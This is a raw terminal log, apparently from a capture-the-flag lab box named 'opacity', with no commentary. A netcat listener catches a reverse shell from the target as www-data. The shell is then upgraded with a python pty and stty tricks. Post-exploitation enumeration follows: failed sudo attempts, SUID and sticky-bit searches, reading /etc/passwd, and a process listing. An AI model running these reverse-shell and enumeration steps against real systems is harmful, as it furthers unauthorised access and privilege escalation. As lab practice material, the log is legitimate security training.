
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.66.65] 44926
Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 20:14:20 up  1:54,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can´t access tty; job control turned off
$ 
$ whoami                                                                                           
www-data                                                                                           
$ ls -la                                                                                           
total 1779788                                                                                      
drwxr-xr-x  19 root root       4096 Jul 26  2022 .                                                 
drwxr-xr-x  19 root root       4096 Jul 26  2022 ..                                                
lrwxrwxrwx   1 root root          7 Feb 23  2022 bin -> usr/bin                                    
drwxr-xr-x   4 root root       4096 Feb 22  2023 boot                                              
drwxr-xr-x  18 root root       3900 Apr  4 18:20 dev                                               
drwxr-xr-x 105 root root       4096 Feb 22  2023 etc                                               
drwxr-xr-x   3 root root       4096 Jul 26  2022 home                                              
lrwxrwxrwx   1 root root          7 Feb 23  2022 lib -> usr/lib                                    
lrwxrwxrwx   1 root root          9 Feb 23  2022 lib32 -> usr/lib32
lrwxrwxrwx   1 root root          9 Feb 23  2022 lib64 -> usr/lib64
lrwxrwxrwx   1 root root         10 Feb 23  2022 libx32 -> usr/libx32
drwx------   2 root root      16384 Jul 26  2022 lost+found
drwxr-xr-x   2 root root       4096 Feb 23  2022 media
drwxr-xr-x   2 root root       4096 Feb 23  2022 mnt
drwxr-xr-x   2 root root       4096 Jul 26  2022 opt
dr-xr-xr-x 186 root root          0 Apr  4 18:19 proc
drwx------   5 root root       4096 Feb 22  2023 root
drwxr-xr-x  30 root root        880 Apr  4 18:23 run
lrwxrwxrwx   1 root root          8 Feb 23  2022 sbin -> usr/sbin
drwxr-xr-x   6 root root       4096 Feb 23  2022 snap
drwxr-xr-x   2 root root       4096 Feb 23  2022 srv
-rw-------   1 root root 1822425088 Jul 26  2022 swap.img
dr-xr-xr-x  13 root root          0 Apr  4 18:19 sys
drwxrwxrwt   2 root root       4096 Apr  4 18:20 tmp
drwxr-xr-x  14 root root       4096 Feb 23  2022 usr
drwxr-xr-x  14 root root       4096 Jul 26  2022 var
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@opacity:/$ ^Z                                                                                                        
zsh: suspended  nc -lvnp 443                                                                                                  
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg          
[1]  + continued  nc -lvnp 443

www-data@opacity:/$ export TERM=xterm
www-data@opacity:/$ ls -la
total 1779788
drwxr-xr-x  19 root root       4096 Jul 26  2022 .
drwxr-xr-x  19 root root       4096 Jul 26  2022 ..
lrwxrwxrwx   1 root root          7 Feb 23  2022 bin -> usr/bin
drwxr-xr-x   4 root root       4096 Feb 22  2023 boot
drwxr-xr-x  18 root root       3900 Apr  4 18:20 dev
drwxr-xr-x 105 root root       4096 Feb 22  2023 etc
drwxr-xr-x   3 root root       4096 Jul 26  2022 home
lrwxrwxrwx   1 root root          7 Feb 23  2022 lib -> usr/lib
lrwxrwxrwx   1 root root          9 Feb 23  2022 lib32 -> usr/lib32
lrwxrwxrwx   1 root root          9 Feb 23  2022 lib64 -> usr/lib64
lrwxrwxrwx   1 root root         10 Feb 23  2022 libx32 -> usr/libx32
drwx------   2 root root      16384 Jul 26  2022 lost+found
drwxr-xr-x   2 root root       4096 Feb 23  2022 media
drwxr-xr-x   2 root root       4096 Feb 23  2022 mnt
drwxr-xr-x   2 root root       4096 Jul 26  2022 opt
dr-xr-xr-x 188 root root          0 Apr  4 18:19 proc
drwx------   5 root root       4096 Feb 22  2023 root
drwxr-xr-x  30 root root        880 Apr  4 18:23 run
lrwxrwxrwx   1 root root          8 Feb 23  2022 sbin -> usr/sbin
drwxr-xr-x   6 root root       4096 Feb 23  2022 snap
drwxr-xr-x   2 root root       4096 Feb 23  2022 srv
-rw-------   1 root root 1822425088 Jul 26  2022 swap.img
dr-xr-xr-x  13 root root          0 Apr  4 18:19 sys
drwxrwxrwt   2 root root       4096 Apr  4 18:20 tmp
drwxr-xr-x  14 root root       4096 Feb 23  2022 usr
drwxr-xr-x  14 root root       4096 Jul 26  2022 var
www-data@opacity:/$ cd gome
bash: cd: gome: No such file or directory
www-data@opacity:/$ cd home
www-data@opacity:/home$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Jul 26  2022 .
drwxr-xr-x 19 root     root     4096 Jul 26  2022 ..
drwxr-xr-x  6 sysadmin sysadmin 4096 Feb 22  2023 sysadmin
www-data@opacity:/home$ cd sysadmin
www-data@opacity:/home/sysadmin$ ls -la
total 44
drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 .
drwxr-xr-x 3 root     root     4096 Jul 26  2022 ..
-rw------- 1 sysadmin sysadmin   22 Feb 22  2023 .bash_history
-rw-r--r-- 1 sysadmin sysadmin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sysadmin sysadmin 3771 Feb 25  2020 .bashrc
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .cache
drwx------ 3 sysadmin sysadmin 4096 Jul 28  2022 .gnupg
-rw-r--r-- 1 sysadmin sysadmin  807 Feb 25  2020 .profile
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .ssh
-rw-r--r-- 1 sysadmin sysadmin    0 Jul 28  2022 .sudo_as_admin_successful
-rw------- 1 sysadmin sysadmin   33 Jul 26  2022 local.txt
drwxr-xr-x 3 root     root     4096 Jul  8  2022 scripts
www-data@opacity:/home/sysadmin$ cd .ssh
bash: cd: .ssh: Permission denied
www-data@opacity:/home/sysadmin$ cat .bash_history
cat: .bash_history: Permission denied
www-data@opacity:/home/sysadmin$ cat local.txt
cat: local.txt: Permission denied
www-data@opacity:/home/sysadmin$ sudo -l
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
sudo: 3 incorrect password attempts
www-data@opacity:/home/sysadmin$ ls -la
total 44
drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 .
drwxr-xr-x 3 root     root     4096 Jul 26  2022 ..
-rw------- 1 sysadmin sysadmin   22 Feb 22  2023 .bash_history
-rw-r--r-- 1 sysadmin sysadmin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sysadmin sysadmin 3771 Feb 25  2020 .bashrc
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .cache
drwx------ 3 sysadmin sysadmin 4096 Jul 28  2022 .gnupg
-rw-r--r-- 1 sysadmin sysadmin  807 Feb 25  2020 .profile
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .ssh
-rw-r--r-- 1 sysadmin sysadmin    0 Jul 28  2022 .sudo_as_admin_successful
-rw------- 1 sysadmin sysadmin   33 Jul 26  2022 local.txt
drwxr-xr-x 3 root     root     4096 Jul  8  2022 scripts
www-data@opacity:/home/sysadmin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@opacity:/home/sysadmin$ whoami
www-data
www-data@opacity:/home/sysadmin$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.5 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.5 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
www-data@opacity:/home/sysadmin$ find / -perm -u=s -type f 2>/dev/null
/snap/core20/1328/usr/bin/chfn
/snap/core20/1328/usr/bin/chsh
/snap/core20/1328/usr/bin/gpasswd
/snap/core20/1328/usr/bin/mount
/snap/core20/1328/usr/bin/newgrp
/snap/core20/1328/usr/bin/passwd
/snap/core20/1328/usr/bin/su
/snap/core20/1328/usr/bin/sudo
/snap/core20/1328/usr/bin/umount
/snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1328/usr/lib/openssh/ssh-keysign
/snap/core20/1587/usr/bin/chfn
/snap/core20/1587/usr/bin/chsh
/snap/core20/1587/usr/bin/gpasswd
/snap/core20/1587/usr/bin/mount
/snap/core20/1587/usr/bin/newgrp
/snap/core20/1587/usr/bin/passwd
/snap/core20/1587/usr/bin/su
/snap/core20/1587/usr/bin/sudo
/snap/core20/1587/usr/bin/umount
/snap/core20/1587/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1587/usr/lib/openssh/ssh-keysign
/snap/snapd/14978/usr/lib/snapd/snap-confine
/snap/snapd/16292/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/su
/usr/bin/at
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/sudo
www-data@opacity:/home/sysadmin$ sudo
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
            [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] file ...
www-data@opacity:/home/sysadmin$ sudo -l
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
qwe
Sorry, try again.
[sudo] password for www-data: 

sudo: 3 incorrect password attempts
www-data@opacity:/home/sysadmin$ 
www-data@opacity:/home/sysadmin$ find / -perm -1000 -type d 2>/dev/null
/snap/core20/1328/run/lock
/snap/core20/1328/tmp
/snap/core20/1328/var/tmp
/snap/core20/1587/run/lock
/snap/core20/1587/tmp
/snap/core20/1587/var/tmp
/run/screen
/run/lock
/sys/fs/bpf
/tmp
/dev/mqueue
/dev/shm
/var/spool/samba
/var/spool/cron/crontabs
/var/spool/cron/atjobs
/var/spool/cron/atspool
/var/lib/php/sessions
/var/lib/samba/usershares
/var/tmp
/var/crash
www-data@opacity:/home/sysadmin$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sysadmin:x:1000:1000:sysadmin:/home/sysadmin:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
www-data@opacity:/home/sysadmin$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  1.0 103592 10136 ?        Ss   18:19   0:06 /sbin/init ma
root           2  0.0  0.0      0     0 ?        S    18:19   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   18:19   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   18:19   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   18:19   0:00 [kworker/0:0H
root           8  0.0  0.0      0     0 ?        I<   18:19   0:00 [mm_percpu_wq
root           9  0.0  0.0      0     0 ?        S    18:19   0:01 [ksoftirqd/0]
root          10  0.0  0.0      0     0 ?        I    18:19   0:00 [rcu_sched]
root          11  0.0  0.0      0     0 ?        S    18:19   0:00 [migration/0]
root          12  0.0  0.0      0     0 ?        S    18:19   0:00 [idle_inject/
root          14  0.0  0.0      0     0 ?        S    18:19   0:00 [cpuhp/0]
root          15  0.0  0.0      0     0 ?        S    18:19   0:00 [kdevtmpfs]
root          16  0.0  0.0      0     0 ?        I<   18:19   0:00 [netns]
root          17  0.0  0.0      0     0 ?        S    18:19   0:00 [rcu_tasks_kt
root          18  0.0  0.0      0     0 ?        S    18:19   0:00 [kauditd]
root          19  0.0  0.0      0     0 ?        S    18:19   0:00 [khungtaskd]
root          20  0.0  0.0      0     0 ?        S    18:19   0:00 [oom_reaper]
root          21  0.0  0.0      0     0 ?        I<   18:19   0:00 [writeback]
root          22  0.0  0.0      0     0 ?        S    18:19   0:00 [kcompactd0]
root          23  0.0  0.0      0     0 ?        SN   18:19   0:00 [ksmd]
root          24  0.0  0.0      0     0 ?        SN   18:19   0:00 [khugepaged]
root          70  0.0  0.0      0     0 ?        I<   18:19   0:00 [kintegrityd]
root          71  0.0  0.0      0     0 ?        I<   18:19   0:00 [kblockd]
root          72  0.0  0.0      0     0 ?        I<   18:19   0:00 [blkcg_punt_b
root          73  0.0  0.0      0     0 ?        S    18:19   0:00 [xen-balloon]
root          74  0.0  0.0      0     0 ?        I<   18:19   0:00 [tpm_dev_wq]
root          75  0.0  0.0      0     0 ?        I<   18:19   0:00 [ata_sff]
root          76  0.0  0.0      0     0 ?        I<   18:19   0:00 [md]
root          77  0.0  0.0      0     0 ?        I<   18:19   0:00 [edac-poller]
root          78  0.0  0.0      0     0 ?        I<   18:19   0:00 [devfreq_wq]
root          79  0.0  0.0      0     0 ?        S    18:19   0:00 [watchdogd]
root          84  0.0  0.0      0     0 ?        S    18:19   0:00 [kswapd0]
root          85  0.0  0.0      0     0 ?        S    18:19   0:00 [ecryptfs-kth
root          87  0.0  0.0      0     0 ?        I<   18:19   0:00 [kthrotld]
root          88  0.0  0.0      0     0 ?        I<   18:19   0:00 [acpi_thermal
root          89  0.0  0.0      0     0 ?        S    18:19   0:00 [xenbus]
root          90  0.0  0.0      0     0 ?        S    18:19   0:00 [xenwatch]
root          91  0.0  0.0      0     0 ?        S    18:19   0:00 [scsi_eh_0]
root          92  0.0  0.0      0     0 ?        I<   18:19   0:00 [scsi_tmf_0]
root          93  0.0  0.0      0     0 ?        S    18:19   0:00 [scsi_eh_1]
root          94  0.0  0.0      0     0 ?        I<   18:19   0:00 [scsi_tmf_1]
root          96  0.0  0.0      0     0 ?        I<   18:19   0:00 [vfio-irqfd-c
root          97  0.0  0.0      0     0 ?        I<   18:19   0:00 [ipv6_addrcon
root         104  0.0  0.0      0     0 ?        I<   18:19   0:00 [kworker/0:1H
root         107  0.0  0.0      0     0 ?        I<   18:19   0:00 [kstrp]
root         110  0.0  0.0      0     0 ?        I<   18:19   0:00 [kworker/u31:
root         123  0.0  0.0      0     0 ?        I<   18:19   0:00 [charger_mana
root         176  0.0  0.0      0     0 ?        I<   18:19   0:00 [cryptd]
root         189  0.0  0.0      0     0 ?        I<   18:19   0:00 [kdmflush]
root         226  0.0  0.0      0     0 ?        I<   18:19   0:00 [raid5wq]
root         273  0.0  0.0      0     0 ?        S    18:19   0:00 [jbd2/dm-0-8]
root         274  0.0  0.0      0     0 ?        I<   18:19   0:00 [ext4-rsv-con
root         344  0.0  1.1  52132 11372 ?        S<s  18:19   0:01 /lib/systemd/
root         378  0.0  0.5  22632  5204 ?        Ss   18:19   0:01 /lib/systemd/
root         487  0.0  0.0      0     0 ?        I<   18:20   0:00 [kaluad]
root         488  0.0  0.0      0     0 ?        I<   18:20   0:00 [kmpath_rdacd
root         489  0.0  0.0      0     0 ?        I<   18:20   0:00 [kmpathd]
root         490  0.0  0.0      0     0 ?        I<   18:20   0:00 [kmpath_handl
root         491  0.0  1.8 280200 18000 ?        SLsl 18:20   0:00 /sbin/multipa
root         499  0.0  0.0      0     0 ?        S<   18:20   0:00 [loop0]
root         502  0.0  0.0      0     0 ?        S<   18:20   0:00 [loop1]
root         504  0.0  0.0      0     0 ?        S<   18:20   0:00 [loop2]
root         505  0.0  0.0      0     0 ?        S<   18:20   0:00 [loop3]
root         509  0.0  0.0      0     0 ?        S<   18:20   0:00 [loop4]
root         510  0.0  0.0      0     0 ?        S<   18:20   0:00 [loop5]
root         518  0.0  0.0      0     0 ?        S    18:20   0:00 [jbd2/xvda2-8
root         519  0.0  0.0      0     0 ?        I<   18:20   0:00 [ext4-rsv-con
systemd+     531  0.0  0.4  90880  4976 ?        Ssl  18:20   0:00 /lib/systemd/
systemd+     571  0.0  0.6  27264  6540 ?        Ss   18:20   0:00 /lib/systemd/
systemd+     574  0.0  1.0  24412 10952 ?        Ss   18:20   0:00 /lib/systemd/
root         585  0.0  0.8 239280  8852 ?        Ssl  18:20   0:00 /usr/lib/acco
root         586  0.0  1.6 1159412 16372 ?       Ssl  18:20   0:00 /usr/bin/amaz
root         599  0.0  0.2   6816  2540 ?        Ss   18:20   0:00 /usr/sbin/cro
message+     602  0.0  0.4   7568  4316 ?        Ss   18:20   0:00 /usr/bin/dbus
root         614  0.0  1.7  29664 16976 ?        Ss   18:20   0:00 /usr/bin/pyth
root         619  0.0  1.6  69372 16620 ?        Ss   18:20   0:00 /usr/sbin/nmb
root         620  0.0  2.5 218496 25880 ?        Ss   18:20   0:00 php-fpm: mast
root         622  0.0  1.0 238104 10216 ?        Ssl  18:20   0:00 /usr/lib/poli
syslog       624  0.0  0.4 224344  4880 ?        Ssl  18:20   0:00 /usr/sbin/rsy
root         629  0.0  3.6 735740 35908 ?        Ssl  18:20   0:00 /usr/lib/snap
root         632  0.0  0.6  17232  6492 ?        Ss   18:20   0:00 /lib/systemd/
root         640  0.0  1.2 395444 12892 ?        Ssl  18:20   0:00 /usr/lib/udis
daemon       643  0.0  0.2   3796  2208 ?        Ss   18:20   0:00 /usr/sbin/atd
root         681  0.0  0.6  12180  6352 ?        Ss   18:20   0:00 sshd: /usr/sb
root         682  0.0  1.3 318824 13252 ?        Ssl  18:20   0:00 /usr/sbin/Mod
root         684  0.0  0.1   5600  1956 ttyS0    Ss+  18:20   0:00 /sbin/agetty 
root         693  0.0  0.1   5828  1788 tty1     Ss+  18:20   0:00 /sbin/agetty 
root         712  0.0  2.6 217408 26108 ?        Ss   18:20   0:03 /usr/sbin/apa
root         730  0.0  1.9 107920 19348 ?        Ssl  18:20   0:00 /usr/bin/pyth
root         761  0.0  2.4  84964 24640 ?        Ss   18:20   0:00 /usr/sbin/smb
www-data     774  0.0  0.9 218944  9604 ?        S    18:20   0:00 php-fpm: pool
www-data     775  0.0  0.9 218944  9604 ?        S    18:20   0:00 php-fpm: pool
root         836  0.0  1.0  82816 10212 ?        S    18:20   0:00 /usr/sbin/smb
root         837  0.0  0.8  82808  7992 ?        S    18:20   0:00 /usr/sbin/smb
root         862  0.0  1.0  84964 10736 ?        S    18:20   0:00 /usr/sbin/smb
root         926  0.0  0.0      0     0 ?        I    18:20   0:04 [kworker/0:4-
root        1705  0.0  0.0      0     0 ?        I    18:58   0:00 [kworker/u30:
www-data    3161  0.0  1.2 217928 12776 ?        S    19:02   0:00 /usr/sbin/apa
www-data    3176  0.0  1.2 217928 12776 ?        S    19:02   0:00 /usr/sbin/apa
www-data    3195  0.0  1.2 217928 12776 ?        S    19:02   0:00 /usr/sbin/apa
www-data    3197  0.0  1.2 217928 12776 ?        S    19:02   0:00 /usr/sbin/apa
www-data    3201  0.0  1.2 217928 12776 ?        S    19:02   0:00 /usr/sbin/apa
www-data    3208  0.0  1.2 217928 12776 ?        S    19:02   0:00 /usr/sbin/apa
www-data    3209  0.0  1.2 217928 12776 ?        S    19:02   0:00 /usr/sbin/apa
www-data    3211  0.0  1.7 217928 17536 ?        S    19:02   0:00 /usr/sbin/apa
www-data    3212  0.0  1.2 217928 12776 ?        S    19:02   0:00 /usr/sbin/apa
www-data    3215  0.0  1.2 217928 12776 ?        S    19:02   0:00 /usr/sbin/apa
www-data    3228  0.0  1.2 217928 12776 ?        S    19:03   0:00 /usr/sbin/apa
www-data    3241  0.0  1.2 217928 12776 ?        S    19:03   0:00 /usr/sbin/apa
www-data    3244  0.0  1.2 217928 12776 ?        S    19:03   0:00 /usr/sbin/apa
www-data    3245  0.0  1.2 217928 12776 ?        S    19:03   0:00 /usr/sbin/apa
www-data    3249  0.0  1.2 217928 12776 ?        S    19:03   0:00 /usr/sbin/apa
www-data    3250  0.0  1.2 217928 12776 ?        S    19:03   0:00 /usr/sbin/apa
www-data    3253  0.0  1.2 217928 12776 ?        S    19:03   0:00 /usr/sbin/apa
www-data    3256  0.0  1.2 217928 12776 ?        S    19:03   0:00 /usr/sbin/apa
www-data    3260  0.0  1.2 217928 12776 ?        S    19:03   0:00 /usr/sbin/apa
www-data    3263  0.0  1.2 217928 12776 ?        S    19:03   0:00 /usr/sbin/apa
www-data    3269  0.0  1.2 217928 12776 ?        S    19:03   0:00 /usr/sbin/apa
www-data    3272  0.0  1.2 217928 12776 ?        S    19:03   0:00 /usr/sbin/apa
www-data    3311  0.0  1.2 217928 12776 ?        S    19:04   0:00 /usr/sbin/apa
root        3972  0.0  0.0      0     0 ?        I    20:09   0:00 [kworker/0:0-
www-data    3999  0.0  0.0   2608   492 ?        S    20:14   0:00 sh -c uname -
www-data    4003  0.0  0.0   2608   556 ?        S    20:14   0:00 /bin/sh -i
www-data    4012  0.0  0.8  15964  8528 ?        S    20:16   0:00 python3 -c im
www-data    4013  0.0  0.3   7436  3580 pts/0    Ss   20:16   0:00 /bin/bash
root        4029  0.0  0.0      0     0 ?        I    20:18   0:00 [kworker/u30:
root        4135  0.0  0.0      0     0 ?        I    20:21   0:00 [kworker/0:1-
www-data    4174  0.0  0.3   9088  3144 pts/0    R+   20:25   0:00 ps aux
www-data@opacity:/home/sysadmin$ 

```